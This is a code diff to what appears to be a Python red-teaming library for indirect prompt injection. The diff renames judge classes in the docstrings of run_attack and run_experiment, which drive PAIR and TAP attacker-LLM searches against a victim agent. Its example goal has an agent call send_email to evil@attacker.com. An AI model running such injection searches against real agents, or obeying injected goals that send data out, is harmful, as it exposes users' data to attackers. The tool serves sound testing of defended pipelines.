@@ -9,7 +9,7 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 from dataclasses import dataclass, field
 from typing import Callable, Literal, Optional, Union
 
-from .judges import Judge
+from .metrics import Evaluator
 from .llm_unified import APILLM, UnifiedLLM
 from .attacks.pair import PAIRResult, run_pair
 from .attacks.tap import TAPResult, run_tap
@@ -55,7 +55,7 @@ def run_attack(
     goal: str,
     target_fn: Callable[[str], str],
     attacker_model: Union[str, APILLM],
-    judge: Judge,
+    judge: Evaluator,
     prompt_mode: str = "ipi_single",
     context: Optional[dict] = None,
     verbose: bool = False,
@@ -82,12 +82,12 @@ def run_attack(
                          The function is responsible for all setup (user task, tool calls, etc.).
         attacker_model:  litellm model string.
                          E.g. "gpt-4o", "claude-sonnet-4-6", "together_ai/meta-llama/...".
-        judge:           Judge instance that scores (injection, response) pairs.
-                         Choose from:
-                           EditDistanceJudge(target_response)
-                           IPILLMJudge(model, user_task, target_tool_calls)
-                           GPTJudge(model)
-                           KeywordJudge()
+        judge:           Guidance Evaluator scoring (injection, response) pairs — the
+                         search signal, not the ASR (see ipi.metrics). Choose from:
+                           EvaluatorEditDistanceGetScore(target_response)
+                           EvaluatorIPIGetScore(model, user_task, target_tool_calls)
+                           EvaluatorGenerativeGetScore(model)
+                           EvaluatorKeywordJudge()
         prompt_mode:     Attacker system prompt variant:
                            "ipi_single"    — IPI-specific, one injection per scenario
                            "ipi_universal" — IPI-specific, learns prefix/suffix template (TAP only)
@@ -108,7 +108,7 @@ def run_attack(
         on_topic_prune:  (TAP only) Enable Phase 1 on-topic pruning. Each candidate
                          injection is checked by an evaluator LLM before the target
                          is queried. Off-topic candidates are dropped, saving budget.
-                         Recommended when using IPILLMJudge or GPTJudge. Default False.
+                         Recommended when using EvaluatorIPIGetScore or EvaluatorGenerativeGetScore. Default False.
         on_topic_model:  (TAP only) litellm model string for the on-topic evaluator.
                          Defaults to attacker_model if None. A cheap model (e.g.,
                          "gpt-4o-mini") suffices since only Yes/No is needed.
@@ -121,7 +121,7 @@ def run_attack(
 
     Example:
         from ipi import run_attack
-        from ipi.judges import IPILLMJudge
+        from ipi.metrics import EvaluatorIPIGetScore
 
         def my_agent(injection: str) -> str:
             # Your defended pipeline here. The injection is embedded in a
@@ -133,7 +133,7 @@ def run_attack(
             goal="Call send_email(to='evil@attacker.com')",
             target_fn=my_agent,
             attacker_model="gpt-4o",
-            judge=IPILLMJudge(
+            judge=EvaluatorIPIGetScore(
                 model="gpt-4o",
                 user_task="Summarize inbox",
                 target_tool_calls="send_email(to='evil@attacker.com')",
@@ -183,7 +183,7 @@ def run_experiment(
     scenarios: list[dict],
     target_fn: Callable[[str], str],
     attacker_model: Union[str, APILLM],
-    judge_factory: Callable[[], Judge],
+    judge_factory: Callable[[], Evaluator],
     prompt_mode: str = "ipi_single",
     n_workers: int = 1,
     verbose: bool = False,
@@ -202,14 +202,14 @@ def run_experiment(
                            "target_fn" (callable) — per-scenario override of the global target_fn.
         target_fn:       Default victim pipeline. Overridden if scenario has "target_fn".
         attacker_model:  litellm model string.
-        judge_factory:   Callable() -> Judge.
-                         Called once per scenario to create a fresh judge instance.
+        judge_factory:   Callable() -> guidance Evaluator.
+                         Called once per scenario to create a fresh evaluator.
                          Use a factory so each scenario can configure its own judge
-                         (e.g., EditDistanceJudge with per-scenario target_response):
+                         (e.g. EvaluatorEditDistanceGetScore with a per-scenario target):
 
-                           judge_factory=lambda s: EditDistanceJudge(s["context"]["target_response"])
+                           judge_factory=lambda s: EvaluatorEditDistanceGetScore(s["context"]["target_response"])
 
-                         For a shared judge, use: judge_factory=lambda: IPILLMJudge(model="gpt-4o")
+                         For a shared one: judge_factory=lambda: EvaluatorIPIGetScore(model="gpt-4o")
         prompt_mode:     "ipi_single" | "ipi_universal" | "original".
         n_workers:       Parallel workers. Be careful with API rate limits.
                          n_workers=1 (default) runs scenarios sequentially.
@@ -237,7 +237,7 @@ def run_experiment(
             scenarios=scenarios,
             target_fn=my_defended_agent,
             attacker_model="gpt-4o",
-            judge_factory=lambda: IPILLMJudge(model="gpt-4o"),
+            judge_factory=lambda: EvaluatorIPIGetScore(model="gpt-4o"),
             depth=8, width=5,
         )
         print(result.summary())
